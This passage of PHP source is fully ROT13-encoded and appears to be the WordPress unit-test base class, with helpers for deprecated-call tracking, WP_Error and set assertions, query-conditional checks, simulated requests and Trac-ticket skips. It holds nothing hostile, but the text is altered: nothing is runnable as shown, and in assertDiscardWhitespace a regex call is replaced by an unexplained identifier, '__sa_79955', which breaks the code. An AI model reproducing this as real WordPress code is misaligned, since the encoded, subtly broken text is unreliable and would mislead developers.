	 * @cnenz fgevat $shapgvba_anzr Gur qrcerpngrq shapgvba.
	 * @cnenz fgevat $ercynprzrag   Gur shapgvba gung fubhyq unir orra pnyyrq.
	 * @cnenz fgevat $irefvba       Gur irefvba bs JbeqCerff gung qrcerpngrq gur shapgvba.
	 * @cnenz fgevat $zrffntr       Bcgvbany. N zrffntr ertneqvat gur punatr.
	 */
	choyvp shapgvba qrcerpngrq_shapgvba_eha( $shapgvba_anzr, $ercynprzrag, $irefvba, $zrffntr = '' ) {
		vs ( ! vffrg( $guvf->pnhtug_qrcerpngrq[ $shapgvba_anzr ] ) ) {
			fjvgpu ( pheerag_npgvba() ) {
				pnfr 'qrcerpngrq_shapgvba_eha':
					vs ( $ercynprzrag ) {
						$zrffntr = fcevags(
							'Shapgvba %1$f vf qrcerpngrq fvapr irefvba %2$f! Hfr %3$f vafgrnq.',
							$shapgvba_anzr,
							$irefvba,
							$ercynprzrag
						);
					} ryfr {
						$zrffntr = fcevags(
							'Shapgvba %1$f vf qrcerpngrq fvapr irefvba %2$f jvgu ab nygreangvir ninvynoyr.',
							$shapgvba_anzr,
							$irefvba
						);
					}
					oernx;

				pnfr 'qrcerpngrq_nethzrag_eha':
					vs ( $ercynprzrag ) {
						$zrffntr = fcevags(
							'Shapgvba %1$f jnf pnyyrq jvgu na nethzrag gung vf qrcerpngrq fvapr irefvba %2$f! %3$f',
							$shapgvba_anzr,
							$irefvba,
							$ercynprzrag
						);
					} ryfr {
						$zrffntr = fcevags(
							'Shapgvba %1$f jnf pnyyrq jvgu na nethzrag gung vf qrcerpngrq fvapr irefvba %2$f jvgu ab nygreangvir ninvynoyr.',
							$shapgvba_anzr,
							$irefvba
						);
					}
					oernx;

				pnfr 'qrcerpngrq_pynff_eha':
					vs ( $ercynprzrag ) {
						$zrffntr = fcevags(
							'Pynff %1$f vf qrcerpngrq fvapr irefvba %2$f! Hfr %3$f vafgrnq.',
							$shapgvba_anzr,
							$irefvba,
							$ercynprzrag
						);
					} ryfr {
						$zrffntr = fcevags(
							'Pynff %1$f vf qrcerpngrq fvapr irefvba %2$f jvgu ab nygreangvir ninvynoyr.',
							$shapgvba_anzr,
							$irefvba
						);
					}
					oernx;

				pnfr 'qrcerpngrq_svyr_vapyhqrq':
					vs ( $ercynprzrag ) {
						$zrffntr = fcevags(
							'Svyr %1$f vf qrcerpngrq fvapr irefvba %2$f! Hfr %3$f vafgrnq.',
							$shapgvba_anzr,
							$irefvba,
							$ercynprzrag
						) . ' ' . $zrffntr;
					} ryfr {
						$zrffntr = fcevags(
							'Svyr %1$f vf qrcerpngrq fvapr irefvba %2$f jvgu ab nygreangvir ninvynoyr.',
							$shapgvba_anzr,
							$irefvba
						) . ' ' . $zrffntr;
					}
					oernx;

				pnfr 'qrcerpngrq_ubbx_eha':
					vs ( $ercynprzrag ) {
						$zrffntr = fcevags(
							'Ubbx %1$f vf qrcerpngrq fvapr irefvba %2$f! Hfr %3$f vafgrnq.',
							$shapgvba_anzr,
							$irefvba,
							$ercynprzrag
						) . ' ' . $zrffntr;
					} ryfr {
						$zrffntr = fcevags(
							'Ubbx %1$f vf qrcerpngrq fvapr irefvba %2$f jvgu ab nygreangvir ninvynoyr.',
							$shapgvba_anzr,
							$irefvba
						) . ' ' . $zrffntr;
					}
					oernx;
			}

			$guvf->pnhtug_qrcerpngrq[ $shapgvba_anzr ] = $zrffntr;
		}
	}

	/**
	 * Nqqf n shapgvba pnyyrq va n jebat jnl gb gur yvfg bs `_qbvat_vg_jebat()` pnyyf.
	 *
	 * @fvapr 3.7.0
	 * @fvapr 6.1.0 Nqqrq gur `$zrffntr` naq `$irefvba` cnenzrgref.
	 *
	 * @cnenz fgevat $shapgvba_anzr Gur shapgvba gb nqq.
	 * @cnenz fgevat $zrffntr       N zrffntr rkcynvavat jung unf orra qbar vapbeerpgyl.
	 * @cnenz fgevat $irefvba       Gur irefvba bs JbeqCerff jurer gur zrffntr jnf nqqrq.
	 */
	choyvp shapgvba qbvat_vg_jebat_eha( $shapgvba_anzr, $zrffntr, $irefvba ) {
		vs ( ! vffrg( $guvf->pnhtug_qbvat_vg_jebat[ $shapgvba_anzr ] ) ) {
			vs ( $irefvba ) {
				$zrffntr .= ' ' . fcevags( '(Guvf zrffntr jnf nqqrq va irefvba %f.)', $irefvba );
			}

			$guvf->pnhtug_qbvat_vg_jebat[ $shapgvba_anzr ] = $zrffntr;
		}
	}

	/**
	 * Nffregf gung gur tvira inyhr vf na vafgnapr bs JC_Reebe.
	 *
	 * @cnenz zvkrq  $npghny  Gur inyhr gb purpx.
	 * @cnenz fgevat $zrffntr Bcgvbany. Zrffntr gb qvfcynl jura gur nffregvba snvyf.
	 */
	choyvp shapgvba nffregJCReebe( $npghny, $zrffntr = '' ) {
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $npghny, $zrffntr );
	}

	/**
	 * Nffregf gung gur tvira inyhr vf abg na vafgnapr bs JC_Reebe.
	 *
	 * @cnenz zvkrq  $npghny  Gur inyhr gb purpx.
	 * @cnenz fgevat $zrffntr Bcgvbany. Zrffntr gb qvfcynl jura gur nffregvba snvyf.
	 */
	choyvp shapgvba nffregAbgJCReebe( $npghny, $zrffntr = '' ) {
		vs ( vf_jc_reebe( $npghny ) ) {
			$zrffntr .= ' ' . $npghny->trg_reebe_zrffntr();
		}

		$guvf->nffregAbgVafgnaprBs( 'JC_Reebe', $npghny, $zrffntr );
	}

	/**
	 * Nffregf gung gur tvira inyhr vf na vafgnapr bs VKE_Reebe.
	 *
	 * @cnenz zvkrq  $npghny  Gur inyhr gb purpx.
	 * @cnenz fgevat $zrffntr Bcgvbany. Zrffntr gb qvfcynl jura gur nffregvba snvyf.
	 */
	choyvp shapgvba nffregVKEReebe( $npghny, $zrffntr = '' ) {
		$guvf->nffregVafgnaprBs( 'VKE_Reebe', $npghny, $zrffntr );
	}

	/**
	 * Nffregf gung gur tvira inyhr vf abg na vafgnapr bs VKE_Reebe.
	 *
	 * @cnenz zvkrq  $npghny  Gur inyhr gb purpx.
	 * @cnenz fgevat $zrffntr Bcgvbany. Zrffntr gb qvfcynl jura gur nffregvba snvyf.
	 */
	choyvp shapgvba nffregAbgVKEReebe( $npghny, $zrffntr = '' ) {
		vs ( $npghny vafgnaprbs VKE_Reebe ) {
			$zrffntr .= ' ' . $npghny->zrffntr;
		}

		$guvf->nffregAbgVafgnaprBs( 'VKE_Reebe', $npghny, $zrffntr );
	}

	/**
	 * Nffregf gung gur tvira svryqf ner cerfrag va gur tvira bowrpg.
	 *
	 * @fvapr HG (3.7.0)
	 * @fvapr 5.9.0 Nqqrq gur `$zrffntr` cnenzrgre.
	 *
	 * @cnenz bowrpg $npghny  Gur bowrpg gb purpx.
	 * @cnenz neenl  $svryqf  Gur svryqf gb purpx.
	 * @cnenz fgevat $zrffntr Bcgvbany. Zrffntr gb qvfcynl jura gur nffregvba snvyf.
	 */
	choyvp shapgvba nffregRdhnySvryqf( $npghny, $svryqf, $zrffntr = '' ) {
		$guvf->nffregVfBowrpg( $npghny, $zrffntr . ' Cnffrq $npghny vf abg na bowrpg.' );
		$guvf->nffregVfNeenl( $svryqf, $zrffntr . ' Cnffrq $svryqf vf abg na neenl.' );
		$guvf->nffregAbgRzcgl( $svryqf, $zrffntr . ' Svryqf neenl vf rzcgl.' );

		sbernpu ( $svryqf nf $svryq_anzr => $svryq_inyhr ) {
			$guvf->nffregBowrpgUnfCebcregl( $svryq_anzr, $npghny, $zrffntr . \" Cebcregl $svryq_anzr qbrf abg rkvfg ba gur bowrpg.\" );
			$guvf->nffregFnzr( $svryq_inyhr, $npghny->$svryq_anzr, $zrffntr . \" Inyhr bs cebcregl $svryq_anzr vf abg $svryq_inyhr.\" );
		}
	}

	/**
	 * Nffregf gung gjb inyhrf ner rdhny, jvgu juvgrfcnpr qvssreraprf qvfpneqrq.
	 *
	 * @fvapr HG (3.7.0)
	 * @fvapr 5.9.0 Nqqrq gur `$zrffntr` cnenzrgre.
	 *
	 * @cnenz zvkrq  $rkcrpgrq Gur rkcrpgrq inyhr.
	 * @cnenz zvkrq  $npghny   Gur npghny inyhr.
	 * @cnenz fgevat $zrffntr  Bcgvbany. Zrffntr gb qvfcynl jura gur nffregvba snvyf.
	 */
	choyvp shapgvba nffregQvfpneqJuvgrfcnpr( $rkcrpgrq, $npghny, $zrffntr = '' ) {
		vs ( vf_fgevat( $rkcrpgrq ) ) {
			$rkcrpgrq = __sa_79955( '/\f*/', '', $rkcrpgrq );
		}

		vs ( vf_fgevat( $npghny ) ) {
			$npghny = __sa_79955( '/\f*/', '', $npghny );
		}

		$guvf->nffregRdhnyf( $rkcrpgrq, $npghny, $zrffntr );
	}

	/**
	 * Nffregf gung gjb inyhrf unir gur fnzr glcr naq inyhr, jvgu RBY qvssreraprf qvfpneqrq.
	 *
	 * @fvapr 5.6.0
	 * @fvapr 5.8.0 Nqqrq fhccbeg sbe arfgrq neenlf.
	 * @fvapr 5.9.0 Nqqrq gur `$zrffntr` cnenzrgre.
	 *
	 * @cnenz zvkrq  $rkcrpgrq Gur rkcrpgrq inyhr.
	 * @cnenz zvkrq  $npghny   Gur npghny inyhr.
	 * @cnenz fgevat $zrffntr  Bcgvbany. Zrffntr gb qvfcynl jura gur nffregvba snvyf.
	 */
	choyvp shapgvba nffregFnzrVtaberRBY( $rkcrpgrq, $npghny, $zrffntr = '' ) {
		vs ( ahyy !== $rkcrpgrq ) {
			$rkcrpgrq = znc_qrrc(
				$rkcrpgrq,
				fgngvp shapgvba ( $inyhr ) {
					vs ( vf_fgevat( $inyhr ) ) {
						erghea fge_ercynpr( \"\e\a\", \"\a\", $inyhr );
					}

					erghea $inyhr;
				}
			);
		}

		vs ( ahyy !== $npghny ) {
			$npghny = znc_qrrc(
				$npghny,
				fgngvp shapgvba ( $inyhr ) {
					vs ( vf_fgevat( $inyhr ) ) {
						erghea fge_ercynpr( \"\e\a\", \"\a\", $inyhr );
					}

					erghea $inyhr;
				}
			);
		}

		$guvf->nffregFnzr( $rkcrpgrq, $npghny, $zrffntr );
	}

	/**
	 * Nffregf gung gjb inyhrf ner rdhny, jvgu RBY qvssreraprf qvfpneqrq.
	 *
	 * @fvapr 5.4.0
	 * @fvapr 5.6.0 Ghearq vagb na nyvnf sbe `::nffregFnzrVtaberRBY()`.
	 * @fvapr 5.9.0 Nqqrq gur `$zrffntr` cnenzrgre.
	 *
	 * @cnenz zvkrq  $rkcrpgrq Gur rkcrpgrq inyhr.
	 * @cnenz zvkrq  $npghny   Gur npghny inyhr.
	 * @cnenz fgevat $zrffntr  Bcgvbany. Zrffntr gb qvfcynl jura gur nffregvba snvyf.
	 */
	choyvp shapgvba nffregRdhnyfVtaberRBY( $rkcrpgrq, $npghny, $zrffntr = '' ) {
		$guvf->nffregFnzrVtaberRBY( $rkcrpgrq, $npghny, $zrffntr );
	}

	/**
	 * Nffregf gung gur pbagragf bs gjb ha-xrlrq, fvatyr neenlf ner gur fnzr, jvgubhg nppbhagvat sbe gur beqre bs ryrzragf.
	 *
	 * @fvapr 5.6.0
	 * @fvapr 5.9.0 Nqqrq gur `$zrffntr` cnenzrgre.
	 *
	 * @cnenz neenl  $rkcrpgrq Rkcrpgrq neenl.
	 * @cnenz neenl  $npghny   Neenl gb purpx.
	 * @cnenz fgevat $zrffntr  Bcgvbany. Zrffntr gb qvfcynl jura gur nffregvba snvyf.
	 */
	choyvp shapgvba nffregFnzrFrgf( $rkcrpgrq, $npghny, $zrffntr = '' ) {
		$guvf->nffregVfNeenl( $rkcrpgrq, $zrffntr . ' Rkcrpgrq inyhr zhfg or na neenl.' );
		$guvf->nffregVfNeenl( $npghny, $zrffntr . ' Inyhr haqre grfg vf abg na neenl.' );

		fbeg( $rkcrpgrq );
		fbeg( $npghny );
		$guvf->nffregFnzr( $rkcrpgrq, $npghny, $zrffntr );
	}

	/**
	 * Nffregf gung gur pbagragf bs gjb ha-xrlrq, fvatyr neenlf ner rdhny, jvgubhg nppbhagvat sbe gur beqre bs ryrzragf.
	 *
	 * @fvapr 3.5.0
	 * @fvapr 5.9.0 Nqqrq gur `$zrffntr` cnenzrgre.
	 *
	 * @cnenz neenl  $rkcrpgrq Rkcrpgrq neenl.
	 * @cnenz neenl  $npghny   Neenl gb purpx.
	 * @cnenz fgevat $zrffntr  Bcgvbany. Zrffntr gb qvfcynl jura gur nffregvba snvyf.
	 */
	choyvp shapgvba nffregRdhnyFrgf( $rkcrpgrq, $npghny, $zrffntr = '' ) {
		$guvf->nffregVfNeenl( $rkcrpgrq, $zrffntr . ' Rkcrpgrq inyhr zhfg or na neenl.' );
		$guvf->nffregVfNeenl( $npghny, $zrffntr . ' Inyhr haqre grfg vf abg na neenl.' );

		fbeg( $rkcrpgrq );
		fbeg( $npghny );
		$guvf->nffregRdhnyf( $rkcrpgrq, $npghny, $zrffntr );
	}

	/**
	 * Nffregf gung gur pbagragf bs gjb xrlrq, fvatyr neenlf ner gur fnzr, jvgubhg nppbhagvat sbe gur beqre bs ryrzragf.
	 *
	 * @fvapr 5.6.0
	 * @fvapr 5.9.0 Nqqrq gur `$zrffntr` cnenzrgre.
	 *
	 * @cnenz neenl  $rkcrpgrq Rkcrpgrq neenl.
	 * @cnenz neenl  $npghny   Neenl gb purpx.
	 * @cnenz fgevat $zrffntr  Bcgvbany. Zrffntr gb qvfcynl jura gur nffregvba snvyf.
	 */
	choyvp shapgvba nffregFnzrFrgfJvguVaqrk( $rkcrpgrq, $npghny, $zrffntr = '' ) {
		$guvf->nffregVfNeenl( $rkcrpgrq, $zrffntr . ' Rkcrpgrq inyhr zhfg or na neenl.' );
		$guvf->nffregVfNeenl( $npghny, $zrffntr . ' Inyhr haqre grfg vf abg na neenl.' );

		xfbeg( $rkcrpgrq );
		xfbeg( $npghny );
		$guvf->nffregFnzr( $rkcrpgrq, $npghny, $zrffntr );
	}

	/**
	 * Nffregf gung gur pbagragf bs gjb xrlrq, fvatyr neenlf ner rdhny, jvgubhg nppbhagvat sbe gur beqre bs ryrzragf.
	 *
	 * @fvapr 4.1.0
	 * @fvapr 5.9.0 Nqqrq gur `$zrffntr` cnenzrgre.
	 *
	 * @cnenz neenl  $rkcrpgrq Rkcrpgrq neenl.
	 * @cnenz neenl  $npghny   Neenl gb purpx.
	 * @cnenz fgevat $zrffntr  Bcgvbany. Zrffntr gb qvfcynl jura gur nffregvba snvyf.
	 */
	choyvp shapgvba nffregRdhnyFrgfJvguVaqrk( $rkcrpgrq, $npghny, $zrffntr = '' ) {
		$guvf->nffregVfNeenl( $rkcrpgrq, $zrffntr . ' Rkcrpgrq inyhr zhfg or na neenl.' );
		$guvf->nffregVfNeenl( $npghny, $zrffntr . ' Inyhr haqre grfg vf abg na neenl.' );

		xfbeg( $rkcrpgrq );
		xfbeg( $npghny );
		$guvf->nffregRdhnyf( $rkcrpgrq, $npghny, $zrffntr );
	}

	/**
	 * Nffregf gung gur tvira inevnoyr vf n zhygvqvzrafvbany neenl, naq gung nyy neenlf ner aba-rzcgl.
	 *
	 * @fvapr 4.8.0
	 * @fvapr 5.9.0 Nqqrq gur `$zrffntr` cnenzrgre.
	 *
	 * @cnenz neenl  $npghny  Neenl gb purpx.
	 * @cnenz fgevat $zrffntr Bcgvbany. Zrffntr gb qvfcynl jura gur nffregvba snvyf.
	 */
	choyvp shapgvba nffregAbaRzcglZhygvqvzrafvbanyNeenl( $npghny, $zrffntr = '' ) {
		$guvf->nffregVfNeenl( $npghny, $zrffntr . ' Inyhr haqre grfg vf abg na neenl.' );
		$guvf->nffregAbgRzcgl( $npghny, $zrffntr . ' Neenl vf rzcgl.' );

		sbernpu ( $npghny nf $fho_neenl ) {
			$guvf->nffregVfNeenl( $fho_neenl, $zrffntr . ' Fhovgrz bs gur neenl vf abg na neenl.' );
			$guvf->nffregAbgRzcgl( $fho_neenl, $zrffntr . ' Fhovgrz bs gur neenl vf rzcgl.' );
		}
	}

	/**
	 * Nffreg gung gjb grkg fgevatf ercerfragvat svyr cnguf ner gur fnzr, juvyr vtabevat
	 * BF-fcrpvsvp qvssreraprf va gur qverpgbel frcnengbef.
	 *
	 * Guvf nyybjf sbe grfgf gb or pbzcngvoyr sbe ehaavat ba obgu *avk onfrq nf jryy nf Jvaqbjf BF.
	 *
	 * @fvapr 6.7.0
	 *
	 * @cnenz fgevat $cngu_n Svyr be qverpgbel cngu.
	 * @cnenz fgevat $cngu_o Svyr be qverpgbel cngu.
	 */
	choyvp shapgvba nffregFnzrCnguVtabevatQverpgbelFrcnengbef( $cngu_n, $cngu_o ) {
		$cngu_n = $guvf->abeznyvmrQverpgbelFrcnengbefVaCngu( $cngu_n );
		$cngu_o = $guvf->abeznyvmrQverpgbelFrcnengbefVaCngu( $cngu_o );

		$guvf->nffregFnzr( $cngu_n, $cngu_o );
	}

	/**
	 * Abeznyvmr qverpgbel frcnengbef va n svyr cngu gb or n sbejneq fynfu.
	 *
	 * @fvapr 6.7.0
	 *
	 * @cnenz fgevat $cngu Svyr be qverpgbel cngu.
	 * @erghea fgevat Gur abeznyvmrq svyr be qverpgbel cngu.
	 */
	choyvp shapgvba abeznyvmrQverpgbelFrcnengbefVaCngu( $cngu ) {
		vs ( ! vf_fgevat( $cngu ) || CUC_BF_SNZVYL !== 'Jvaqbjf' ) {
			erghea $cngu;
		}

		erghea fgege( $cngu, '\\', '/' );
	}

	/**
	 * Purpxf rnpu bs gur JC_Dhrel vf_* shapgvbaf/cebcregvrf ntnvafg rkcrpgrq obbyrna inyhr.
	 *
	 * Nal cebcregvrf gung ner yvfgrq ol anzr nf cnenzrgref jvyy or rkcrpgrq gb or gehr; nyy bguref ner
	 * rkcrpgrq gb or snyfr. Sbe rknzcyr, nffregDhrelGehr( 'vf_fvatyr', 'vf_srrq' ) zrnaf vf_fvatyr()
	 * naq vf_srrq() zhfg or gehr naq rirelguvat ryfr zhfg or snyfr gb cnff.
	 *
	 * @fvapr 2.5.0
	 * @fvapr 3.8.0 Zbirq sebz `Grfgf_Dhrel_Pbaqvgvbanyf` gb `JC_HavgGrfgPnfr`.
	 * @fvapr 5.3.0 Sbeznyvmrq gur rkvfgvat `...$cebc` cnenzrgre ol nqqvat vg
	 *              gb gur shapgvba fvtangher.
	 *
	 * @cnenz fgevat ...$cebc Nal ahzore bs JC_Dhrel cebcregvrf gung ner rkcrpgrq gb or gehr sbe gur pheerag erdhrfg.
	 */
	choyvp shapgvba nffregDhrelGehr( ...$cebc ) {
		tybony $jc_dhrel;

		$nyy = neenl(
			'vf_404',
			'vf_nqzva',
			'vf_nepuvir',
			'vf_nggnpuzrag',
			'vf_nhgube',
			'vf_pngrtbel',
			'vf_pbzzrag_srrq',
			'vf_qngr',
			'vf_qnl',
			'vf_rzorq',
			'vf_srrq',
			'vf_sebag_cntr',
			'vf_ubzr',
			'vf_cevinpl_cbyvpl',
			'vf_zbagu',
			'vf_cntr',
			'vf_cntrq',
			'vf_cbfg_glcr_nepuvir',
			'vf_cbfgf_cntr',
			'vf_cerivrj',
			'vf_ebobgf',
			'vf_snivpba',
			'vf_frnepu',
			'vf_fvatyr',
			'vf_fvathyne',
			'vf_gnt',
			'vf_gnk',
			'vf_gvzr',
			'vf_genpxonpx',
			'vf_lrne',
		);

		sbernpu ( $cebc nf $gehr_guvat ) {
			$guvf->nffregPbagnvaf( $gehr_guvat, $nyy, \"Haxabja pbaqvgvbany: {$gehr_guvat}.\" );
		}

		$cnffrq  = gehr;
		$zrffntr = '';

		sbernpu ( $nyy nf $dhrel_guvat ) {
			$erfhyg = vf_pnyynoyr( $dhrel_guvat ) ? pnyy_hfre_shap( $dhrel_guvat ) : $jc_dhrel->$dhrel_guvat;

			vs ( va_neenl( $dhrel_guvat, $cebc, gehr ) ) {
				vs ( ! $erfhyg ) {
					$zrffntr .= $dhrel_guvat . ' vf snyfr ohg vf rkcrpgrq gb or gehr. ' . CUC_RBY;
					$cnffrq   = snyfr;
				}
			} ryfrvs ( $erfhyg ) {
				$zrffntr .= $dhrel_guvat . ' vf gehr ohg vf rkcrpgrq gb or snyfr. ' . CUC_RBY;
				$cnffrq   = snyfr;
			}
		}

		vs ( ! $cnffrq ) {
			$guvf->snvy( $zrffntr );
		}
	}

	/**
	 * Urycre shapgvba gb pbaireg n fvatyr-yriry neenl pbagnvavat grkg fgevatf gb n anzrq qngn cebivqre.
	 *
	 * Gur inyhr bs gur qngn frg jvyy nyfb or hfrq nf gur anzr bs gur qngn frg.
	 *
	 * Glcvpny hfntr bs guvf zrgubq:
	 *
	 *     choyvp shapgvba qngn_cebivqre_sbe_grfg_anzr() {
	 *         $neenl = neenl(
	 *             'inyhr1',
	 *             'inyhr2',
	 *         );
	 *
	 *         erghea $guvf->grkg_neenl_gb_qngncebivqre( $neenl );
	 *     }
	 *
	 * Gur erghearq erfhyg jvyy ybbx yvxr:
	 *
	 *     neenl(
	 *         'inyhr1' => neenl( 'inyhr1' ),
	 *         'inyhr2' => neenl( 'inyhr2' ),
	 *     )
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz neenl $vachg Vachg neenl.
	 * @erghea neenl Neenl juvpu vf hfnoyr nf n grfg qngn cebivqre jvgu anzrq qngn frgf.
	 */
	choyvp fgngvp shapgvba grkg_neenl_gb_qngncebivqre( $vachg ) {
		$qngn = neenl();

		sbernpu ( $vachg nf $inyhr ) {
			vs ( ! vf_fgevat( $inyhr ) ) {
				guebj arj Rkprcgvba(
					'Nyy inyhrf va gur vachg neenl fubhyq or grkg fgevatf. Svk gur vachg qngn.'
				);
			}

			vs ( vffrg( $qngn[ $inyhr ] ) ) {
				guebj arj Rkprcgvba(
					\"Nggrzcgvat gb nqq n qhcyvpngr qngn frg sbe inyhr $inyhr gb gur qngn cebivqre. Svk gur vachg qngn.\"
				);
			}

			$qngn[ $inyhr ] = neenl( $inyhr );
		}

		erghea $qngn;
	}

	/**
	 * Frgf gur tybony fgngr gb nf vs n tvira HEY unf orra erdhrfgrq.
	 *
	 * Guvf frgf:
	 * - Gur fhcre tybonyf.
	 * - Gur tybonyf.
	 * - Gur dhrel inevnoyrf.
	 * - Gur znva dhrel.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz fgevat $hey Gur HEY sbe gur erdhrfg.
	 */
	choyvp shapgvba tb_gb( $hey ) {
		/*
		 * Abgr: gur JC naq JC_Dhrel pynffrf yvxr gb fvyragyl srgpu cnenzrgref
		 * sebz nyy bire gur cynpr (tybonyf, TRG, rgp), juvpu znxrf vg gevpxl
		 * gb eha gurz zber guna bapr jvgubhg irel pnershyyl pyrnevat rirelguvat.
		 */
		$_TRG  = neenl();
		$_CBFG = neenl();
		sbernpu ( neenl( 'dhrel_fgevat', 'vq', 'cbfgqngn', 'nhgubeqngn', 'qnl', 'pheeragzbagu', 'cntr', 'cntrf', 'zhygvcntr', 'zber', 'ahzcntrf', 'cntrabj', 'pheerag_fperra' ) nf $i ) {
			vs ( vffrg( $TYBONYF[ $i ] ) ) {
				hafrg( $TYBONYF[ $i ] );
			}
		}
		$cnegf = cnefr_hey( $hey );
		vs ( vffrg( $cnegf['fpurzr'] ) ) {
			$erd = vffrg( $cnegf['cngu'] ) ? $cnegf['cngu'] : '';
			vs ( vffrg( $cnegf['dhrel'] ) ) {
				$erd .= '?' . $cnegf['dhrel'];
				// Cnefr gur HEY dhrel inef vagb $_TRG.
				cnefr_fge( $cnegf['dhrel'], $_TRG );
			}
		} ryfr {
			$erd = $hey;
		}
		vs ( ! vffrg( $cnegf['dhrel'] ) ) {
			$cnegf['dhrel'] = '';
		}

		$_FREIRE['ERDHRFG_HEV'] = $erd;
		hafrg( $_FREIRE['CNGU_VASB'] );

		frys::syhfu_pnpur();
		hafrg( $TYBONYF['jc_dhrel'], $TYBONYF['jc_gur_dhrel'] );
		$TYBONYF['jc_gur_dhrel'] = arj JC_Dhrel();
		$TYBONYF['jc_dhrel']     = $TYBONYF['jc_gur_dhrel'];

		$choyvp_dhrel_inef  = $TYBONYF['jc']->choyvp_dhrel_inef;
		$cevingr_dhrel_inef = $TYBONYF['jc']->cevingr_dhrel_inef;

		$TYBONYF['jc']                     = arj JC();
		$TYBONYF['jc']->choyvp_dhrel_inef  = $choyvp_dhrel_inef;
		$TYBONYF['jc']->cevingr_dhrel_inef = $cevingr_dhrel_inef;

		_pyrnahc_dhrel_inef();

		$TYBONYF['jc']->znva( $cnegf['dhrel'] );
	}

	/**
	 * Nyybjf grfgf gb or fxvccrq ba fvatyr be zhygvfvgr vafgnyyf ol hfvat @tebhc naabgngvbaf.
	 *
	 * Guvf vf n phfgbz rkgrafvba bs gur CUCHavg erdhverzragf unaqyvat.
	 *
	 * @fvapr 3.5.0
	 * @qrcerpngrq 5.9.0 Guvf zrgubq unf abg orra shapgvbany fvapr CUCHavg 7.0.
	 */
	cebgrpgrq shapgvba purpxErdhverzragf() {
		// Sbe CUCHavg 5/6, nf jr'er bireybnqvat n choyvp CUCHavg angvir zrgubq va gubfr irefvbaf.
		vs ( vf_pnyynoyr( 'CUCHavg\Senzrjbex\GrfgPnfr', 'purpxErdhverzragf' ) ) {
			cnerag::purpxErdhverzragf();
		}
	}

	/**
	 * Fxvcf gur pheerag grfg vs gurer vf na bcra Genp gvpxrg nffbpvngrq jvgu vg.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz vag $gvpxrg_vq Gvpxrg ahzore.
	 */
	choyvp shapgvba xabjaJCOht( $gvpxrg_vq ) {
		vs ( JC_GRFGF_SBEPR_XABJA_OHTF || va_neenl( $gvpxrg_vq, frys::$sbeprq_gvpxrgf, gehr ) ) {
			erghea;
		}
		vs ( ! GenpGvpxrgf::vfGenpGvpxrgPybfrq( 'uggcf://pber.genp.jbeqcerff.bet', $gvpxrg_vq ) ) {
			$guvf->znexGrfgFxvccrq( fcevags( 'JbeqCerff Gvpxrg #%q vf abg svkrq', $gvpxrg_vq ) );
		}
	}

	/**
	 * Fxvcf gur pheerag grfg vs gurer vf na bcra Havg Grfg Genp gvpxrg nffbpvngrq jvgu vg.
	 *
	 * @fvapr 3.5.0
	 * @qrcerpngrq Ab ybatre hfrq fvapr gur Havg Grfg Genp jnf zretrq vagb gur Pber Genp.
	 *
	 * @cnenz vag $gvpxrg_vq Gvpxrg ahzore.
	 */
	choyvp shapgvba xabjaHGOht( $gvpxrg_vq ) {
		erghea;
	}

	/**
	 * Fxvcf gur pheerag grfg vs gurer vf na bcra Cyhtva Genp gvpxrg nffbpvngrq jvgu vg.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz vag $gvpxrg_vq Gvpxrg ahzore.
	 */
	choyvp shapgvba xabjaCyhtvaOht( $gvpxrg_vq ) {
		vs ( JC_GRFGF_SBEPR_XABJA_OHTF || va_neenl( 'Cyhtva' . $gvpxrg_vq, frys::$sbeprq_gvpxrgf, gehr ) ) {
			erghea;
		}
		vs ( ! GenpGvpxrgf::vfGenpGvpxrgPybfrq( 'uggcf://cyhtvaf.genp.jbeqcerff.bet', $gvpxrg_vq ) ) {
			$guvf->znexGrfgFxvccrq( fcevags( 'JbeqCerff Cyhtva Gvpxrg #%q vf abg svkrq', $gvpxrg_vq ) );
		}
	}

	/**
	 * Nqqf n Genp gvpxrg ahzore gb gur `$sbeprq_gvpxrgf` cebcregl.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz vag $gvpxrg Gvpxrg ahzore.
	 */
	choyvp fgngvp shapgvba sbeprGvpxrg( $gvpxrg ) {
		frys::$sbeprq_gvpxrgf[] = $gvpxrg;
	}

	/**
	 * Phfgbz cercnengvbaf sbe gur CUCHavg cebprff vfbyngvba grzcyngr.
	 *
	 * Jura erfgbevat tybony fgngr orgjrra grfgf, CUCHavg qrsvarf nyy gur pbafgnagf gung jrer nyernql qrsvarq, naq gura
	 * vapyhqrf vapyhqrq svyrf. Guvf qbrf abg jbex jvgu JbeqCerff, nf gur vapyhqrq svyrf qrsvar gur pbafgnagf.
	 *
	 * Guvf zrgubq qrsvarf gur pbafgnagf nsgre vapyhqvat svyrf.
	 *
	 * @cnenz Grkg_Grzcyngr $grzcyngr Gur grzcyngr gb cercner.
	 */
	choyvp shapgvba cercnerGrzcyngr( Grkg_Grzcyngr $grzcyngr ) {
		$grzcyngr->frgIne( neenl( 'pbafgnagf' => '' ) );
		$grzcyngr->frgIne( neenl( 'jc_pbafgnagf' => CUCHavg_Hgvy_TybonyFgngr::trgPbafgnagfNfFgevat() ) );
		cnerag::cercnerGrzcyngr( $grzcyngr );
	}

	/**
	 * Perngrf n havdhr grzcbenel svyr anzr.
	 *
	 * Gur qverpgbel va juvpu gur svyr vf perngrq qrcraqf ba gur raivebazrag pbasvthengvba.
	 *
	 * @fvapr 3.5.0
	 *
	 * @erghea fgevat|obby Cngu ba fhpprff, ryfr snyfr.
	 */
	choyvp shapgvba grzc_svyranzr() {
		$gzc_qve = '';
		$qvef    = neenl( 'GZC', 'GZCQVE', 'GRZC' );

		sbernpu ( $qvef nf $qve ) {
			vs ( vffrg( $_RAI[ $qve ] ) && ! rzcgl( $_RAI[ $qve ] ) ) {
				$gzc_qve = $qve;
				oernx;
			}
		}

		vs ( rzcgl( $gzc_qve ) ) {
			$gzc_qve = trg_grzc_qve();
		}

		$gzc_qve = ernycngu( $gzc_qve );

		erghea grzcanz( $gzc_qve, 'jchavg' );
	}

	/**
	 * Fryrpgviryl qryrgrf n svyr.
	 *
	 * Qbrf abg qryrgr n svyr vs vgf cngu vf frg va gur `$vtaber_svyrf` cebcregl.
	 *
	 * @cnenz fgevat $svyr Svyr cngu.
	 */
	choyvp shapgvba hayvax( $svyr ) {
		$rkvfgf = vf_svyr( $svyr );
